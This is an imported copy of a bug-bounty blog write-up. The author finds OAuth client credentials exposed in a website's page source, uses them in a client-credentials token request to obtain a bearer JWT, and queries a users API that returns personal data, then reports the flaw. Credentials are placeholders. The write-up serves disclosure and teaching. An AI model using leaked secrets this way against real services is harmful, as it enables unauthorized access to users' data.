---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-05-12_forging-oauth-tokens-using-discovered-client-id-and-client-secret.md
original_filename: 2022-05-12_forging-oauth-tokens-using-discovered-client-id-and-client-secret.md
title: Forging OAuth tokens using discovered client id and client secret
category: documents
detected_topics:
- oauth
- jwt
- access-control
- command-injection
- otp
- information-disclosure
tags:
- imported
- documents
- oauth
- jwt
- access-control
- command-injection
- otp
- information-disclosure
language: en
raw_sha256: a4b1609e692c0893145c65e40e379d119cbc2d6223e8efdcf5f972b43ef8cce9
text_sha256: 51cfa069efe7b6849dca316cb88d2219a0801835c988bce72a8dddf90059d722
ingested_at: '2026-06-28T07:32:11Z'
sensitivity: unknown
redactions_applied: false
---

# Forging OAuth tokens using discovered client id and client secret

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-05-12_forging-oauth-tokens-using-discovered-client-id-and-client-secret.md
- Source Type: markdown
- Detected Topics: oauth, jwt, access-control, command-injection, otp, information-disclosure
- Ingested At: 2026-06-28T07:32:11Z
- Redactions Applied: False
- Raw SHA256: `a4b1609e692c0893145c65e40e379d119cbc2d6223e8efdcf5f972b43ef8cce9`
- Text SHA256: `51cfa069efe7b6849dca316cb88d2219a0801835c988bce72a8dddf90059d722`


## Content

---
title: "Forging OAuth tokens using discovered client id and client secret"
url: "https://basyounii.medium.com/forging-oauth-tokens-using-discovered-client-id-and-client-secret-d224e4e7892a"
authors: ["Basyouni (@AshrafBasyoni4)"]
bugs: ["Information disclosure", "Account takeover"]
publication_date: "2022-05-12"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2643
scraped_via: "browseros"
---

# Forging OAuth tokens using discovered client id and client secret

Forging OAuth tokens using discovered client id and client secret
Basyouni
Follow
2 min read
·
May 12, 2022

312

2

Below is a short story about leaked OAuth client id and client secret which I found in the page source that led to generating foreign tokens.

Recon:

I usually before using any tool or starting the recon process I take a look at the main domain, when I opened the page source I found OAuth client_id and Client_secret

{
  "ENV": "prod",
  "SERVICE_CLIENT_ID": "mvaxns1234gahnbnjkdfsasdgyjkuigv",
  "SERVICE_CLIENT_SECRET": "2a548s56-as84-d8fg-asd5-ahsndksj12sh",
  "MARKETO_CLIENT_ID": "safsfads-ascd-vcxd-dsfds-adhdnmajkss",
  "MARKETO_CLIENT_SECRET": "nchsjskalionmalkjhyusimnbg12sgdf",
  "SERVICE_OAUTH_CLIENT_API_VERSION": "v2"
};
Disclaimer: all values were replaced
What is OAuth?

OAuth is an open-standard authorization protocol or framework that provides applications the ability for “secure designated access.” For example, you can tell Facebook that it’s OK for Instagram to access your profile or post updates to your story without having to give Instagram your Facebook password. This minimizes risk in a major way: In the event, Instagram suffers a breach, your Facebook password remains safe.

Client Credentials Flow:

The clients need to authenticate themselves for this request. Typically the service will allow either additional request parameters client_id and client_secret, or accept the client ID and secret in the HTTP Basic auth header.

Press enter or click to view image in full size
Your app authenticates with the Auth0 Authorization Server using its Client ID and Client Secret (/oauth/token endpoint).
Your Auth0 Authorization Server validates the Client ID and Client Secret.

3. Your Auth0 Authorization Server responds with an Access Token.

4. Your application can use the Access Token to call an API on behalf of itself.

Get Basyouni’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

5. The API responds with the requested data.

Let’s try to use this credentials

Exploit:

Now I just wanted to check if Client_Id and Client_Secret are still valid:

There are two methods that you can use to include a token in your calls, as an HTTP header, or as a query string parameter:

I used the HTTP header method.

Authorization: Basic <base64 Client_id:Client_secret>

The Client Credentials grant type is used by clients to obtain an access token outside of the context of a user.

POST /{identity url}/oauth/v1/token HTTP/1.1
Host: site.com
Authorization: Basic ehajnnsmnshjaknsjilkmnshtghjklikjWlOTno6VXdsQSgdhjnsmkjdhfbnnmkjshbnbhahsjkkluyhsghbshjnmkdjhead==
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
grant_type=client_credentials
HTTP/1.1 200 OK
Date: Thu, 05 May 2022 21:15:28 GMT
Content-Type: application/json
Content-Length: 1008
Connection: close
Cache-Control: no-cache, no-store, no-transform
{"token_type":"bearer","access_token":"eyJ0[…redacted…]"}

I got back a JWT token.

We can use it to get some data like this

POST /api/v1/users HTTP/1.1
Host: site.com
Authorization: Bearer eyJ0[…redacted…]
Content-Type: application/x-www-form-urlencoded
HTTP/1.1 200 OK
[...]
{
 "username":”Name”,
 "id":"BLALALALA",
 "phone":"21254488"
{
 "username":”Name”,
 "id":"BLALALALA",
 "phone":"21254488"
 
}

I reported the vulnerability, and they accepted it as a high :).
